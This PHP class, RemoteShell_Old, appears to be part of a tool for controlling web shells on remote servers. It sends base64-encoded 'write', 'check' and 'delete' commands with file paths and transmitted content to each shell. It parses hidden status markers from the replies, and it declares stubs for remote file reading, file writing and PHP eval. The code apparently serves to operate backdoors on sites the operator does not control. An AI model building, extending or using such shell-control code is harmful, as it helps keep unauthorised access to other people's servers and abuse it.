<?php

class RemoteShell_Old extends RemoteShell
{
	/**
	 * @return ShellType
	 */
	public function getShellType() {
		return ShellType::getInstance()->fetchByKey('old');
	}

	/**
	 * Return new Zend_Http_Client and set basic HTTP auth
	 * @return Zend_Http_Client
	 */
	protected function _getClient()
	{
		$client = parent::_getClient();

		$path = $this->_getPath();
		$client->setParameterPost('path', base64_encode($path));

		$transmit = $this->_getTransmit();
		$client->setParameterPost('transmit', base64_encode($transmit));

		return $client;
	}

	/**
	 * @return boolean
	 */
	public function write()
	{
		$check = $this->_shell->check();
		$this->_shell->save();
		if (!$check) {
			return false;
		}

		$client = $this->_getClient();
		$client->setParameterPost('action', base64_encode('write'));
		$response = $client->request(Zend_Http_Client::POST);
		$body = $response->getBody();

		if (false === strpos($body, "<!--[SR:200]-->")) {
			throw new RemoteShell_FileException('Response is not 200: ' . $body);
		}

		return true;
	}

	/**
	 * @return boolean
	 */
	public function check()
	{
		$check = $this->_shell->check();
		$this->_shell->save();
		if (!$check) {
			return false;
		}

		$client = $this->_getClient();
		$client->setParameterPost('action', base64_encode('check'));
		$response = $client->request(Zend_Http_Client::POST);
		$body = $response->getBody();

		if (false !== strpos($body, "<!--[SR:110]-->")) {
			return false;
		}

		if (false === strpos($body, "<!--[SR:200]-->")) {
			throw new RemoteShell_FileException('Response is not 200: ' . $body);
		}

		return true;
	}

	/**
	 * @return boolean
	 */
	public function delete()
	{
		$check = $this->_shell->check();
		$this->_shell->save();
		if (!$check) {
			return false;
		}

		$client = $this->_getClient();
		$client->setParameterPost('action', base64_encode('delete'));
		$response = $client->request(Zend_Http_Client::POST);
		$body = $response->getBody();

		if (false === strpos($body, "<!--[SR:200]-->")) {
			throw new RemoteShell_FileException('Response is not 200: ' . $body);
		}

		return true;
	}


	/**
	 * @param string $body HTML content
	 * @return string
	 */
	public function getError($body)
	{
		throw new Exception('Method is not implemented');
	}


	/**
	 * Return full file content getting by remote shell.
	 *
	 * @param string $url Shell uri
	 * @param string $path Full path to remote file
	 * @return string Content of file
	 */
	public function _fileGetContents($path)
	{
		throw new Exception('Method is not implemented');
	}

	/**
	 * Write content into file on remote shell
	 *
	 * @param string $path Full path to remote file
	 * @param string $content Content for write to file
	 * @return boolean
	 */
	public function _filePutContents($path, $content)
	{
		throw new Exception('Method is not implemented');
	}

	/**
	 * Eval php code on shell
	 *
	 * @param string $code PHP code
	 * @return string PHP response
	 */
	public function _evalPhp($code)
	{
		throw new Exception('Method is not implemented');
	}
}